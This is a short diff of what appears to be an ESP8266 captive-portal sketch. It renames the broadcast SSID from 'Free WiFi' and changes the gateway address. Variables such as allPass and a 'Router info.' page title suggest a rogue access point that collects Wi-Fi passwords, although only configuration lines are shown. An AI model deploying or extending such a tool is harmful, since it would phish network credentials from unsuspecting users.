@@ -8,7 +8,7 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char* SSID_NAME = "JINER BADSHA";
 
 // Default main strings
 #define SUBTITLE "Router info."
@@ -23,7 +23,7 @@ const char* SSID_NAME = "Free WiFi";
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
-IPAddress APIP(172, 0, 0, 1); // Gateway
+IPAddress APIP(192, 168, 0, 1); // Gateway
 
 String allPass = "";
 String newSSID = "";
